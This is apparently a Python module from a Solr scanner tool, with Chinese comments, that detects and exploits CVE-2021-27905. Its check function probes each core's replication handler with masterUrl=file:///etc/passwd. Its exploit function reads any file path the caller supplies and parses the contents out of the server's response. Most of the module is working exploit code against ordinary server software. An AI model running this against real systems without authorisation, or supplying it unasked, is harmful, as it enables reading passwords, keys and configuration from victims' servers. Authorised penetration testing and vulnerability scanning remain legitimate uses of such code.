#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2021-27905 漏洞检测模块
Apache Solr Replication Handler SSRF漏洞
"""

import logging
import json
import re
from urllib.parse import urlparse

# 日志配置
logger = logging.getLogger(__name__)

def check(scanner, core=None):
    """
    检测CVE-2021-27905 Replication Handler SSRF漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        logger.info(f"检测CVE-2021-27905漏洞，目标: {scanner.target_url}")
        
        # 获取Solr信息，检查版本
        info = scanner.get_solr_info()
        version = scanner.version if hasattr(scanner, 'version') and scanner.version else "未知"
        
        # 检查版本是否在受影响范围内
        version_vulnerable = False
        if version != "未知":
            try:
                version_parts = version.split('.')
                major_version = int(version_parts[0])
                minor_version = int(version_parts[1])
                patch_version = int(version_parts[2]) if len(version_parts) > 2 else 0
                
                if (major_version < 8) or (major_version == 8 and minor_version < 8) or (major_version == 8 and minor_version == 8 and patch_version < 2):
                    version_vulnerable = True
                    logger.info(f"Solr版本 {version} 在CVE-2021-27905漏洞影响范围内")
                else:
                    logger.info(f"Solr版本 {version} 不在CVE-2021-27905漏洞影响范围内")
            except (ValueError, IndexError):
                logger.warning(f"无法解析Solr版本: {version}")
        
        # 获取核心列表
        cores_to_check = []
        if core:
            cores_to_check = [core]
        else:
            cores = scanner.get_cores()
            if cores:
                cores_to_check = cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores_to_check:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        # 检测每个核心是否存在漏洞
        for core_name in cores_to_check:
            logger.info(f"检测核心 {core_name} 是否存在CVE-2021-27905漏洞")
            
            # 构造测试URL，尝试访问内部文件
            test_url = f"/solr/{core_name}/replication?command=fetchindex&masterUrl=file:///etc/passwd&wt=json"
            
            resp = scanner.request("GET", test_url)
            
            if resp and resp.status_code == 200:
                # 检查响应内容是否包含文件内容特征
                if "root:" in resp.text or "bin:" in resp.text:
                    return True, f"核心 {core_name} 存在CVE-2021-27905 Replication Handler SSRF漏洞，成功读取到/etc/passwd文件内容"
                
                # 检查是否包含错误信息但仍然尝试访问了文件
                if "java.io.FileNotFoundException" in resp.text and "/etc/passwd" in resp.text:
                    return True, f"核心 {core_name} 存在CVE-2021-27905 Replication Handler SSRF漏洞，但目标文件不存在"
                
                # 检查其他可能的漏洞特征
                if "Exception" in resp.text and "fetchindex" in resp.text and "masterUrl" in resp.text:
                    return True, f"核心 {core_name} 可能存在CVE-2021-27905 Replication Handler SSRF漏洞，但无法确认"
        
        # 如果所有核心都检测完毕但未发现漏洞
        if version_vulnerable:
            return False, f"Solr版本 {version} 在漏洞影响范围内，但未检测到CVE-2021-27905漏洞"
        else:
            return False, f"未检测到CVE-2021-27905漏洞"
    except Exception as e:
        logger.error(f"检测CVE-2021-27905异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, core=None, file_path=None):
    """
    利用CVE-2021-27905漏洞读取文件
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时使用第一个可用核心
        file_path: 要读取的文件路径
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        if not file_path:
            return False, "请提供要读取的文件路径，例如: /etc/passwd"
        
        logger.info(f"利用CVE-2021-27905漏洞读取文件: {file_path}")
        
        # 获取可用的核心
        cores = []
        if core:
            cores = [core]
        else:
            available_cores = scanner.get_cores()
            if available_cores:
                cores = available_cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        core_name = cores[0]
        logger.info(f"使用核心 {core_name} 尝试读取文件")
        
        # 构造利用URL
        exploit_url = f"/solr/{core_name}/replication?command=fetchindex&masterUrl=file://{file_path}&wt=json"
        
        resp = scanner.request("GET", exploit_url)
        
        if not resp:
            return False, "请求失败，未收到响应"
        
        if resp.status_code != 200:
            return False, f"请求失败，HTTP状态码: {resp.status_code}"
        
        # 尝试从响应中提取文件内容
        content = resp.text
        
        # 检查是否文件不存在
        if "java.io.FileNotFoundException" in content:
            return False, f"文件 {file_path} 不存在或无法访问"
        
        # 检查是否有权限问题
        if "java.security.AccessControlException" in content or "Permission denied" in content:
            return False, f"无权限访问文件 {file_path}"
        
        # 尝试提取有用的内容
        try:
            # 如果是JSON格式，提取有用信息
            data = json.loads(content)
            if "exception" in data:
                exception = data["exception"]
                # 尝试从异常中提取文件内容
                file_content = re.search(r'file content:(.*)', exception, re.DOTALL)
                if file_content:
                    return True, file_content.group(1).strip()
                else:
                    return True, exception
            elif "status" in data and data["status"] == "OK":
                return True, "文件读取成功，但内容可能在其他响应字段中"
            else:
                # 返回整个JSON响应
                return True, json.dumps(data, indent=2)
        except json.JSONDecodeError:
            # 不是JSON格式，直接返回内容
            # 尝试清理响应，提取有用部分
            clean_content = content
            
            # 移除HTML标签
            clean_content = re.sub(r'<[^>]+>', '', clean_content)
            
            # 如果内容太长，尝试提取关键部分
            if len(clean_content) > 1000:
                # 尝试提取文件内容相关部分
                file_content = re.search(r'(root:.*)', clean_content, re.DOTALL)
                if file_content:
                    return True, file_content.group(1).strip()
            
            return True, clean_content
    except Exception as e:
        logger.error(f"利用CVE-2021-27905异常: {str(e)}")
        return False, f"利用异常: {str(e)}"

def get_required_params():
    """
    获取漏洞利用所需参数
    
    Returns:
        dict: 参数说明字典
    """
    return {
        "check": {
            "core": "Solr核心名称，如不提供将自动检测所有核心"
        },
        "exploit": {
            "core": "Solr核心名称，如不提供将使用第一个可用核心",
            "file_path": "要读取的文件路径，例如: /etc/passwd"
        }
    }
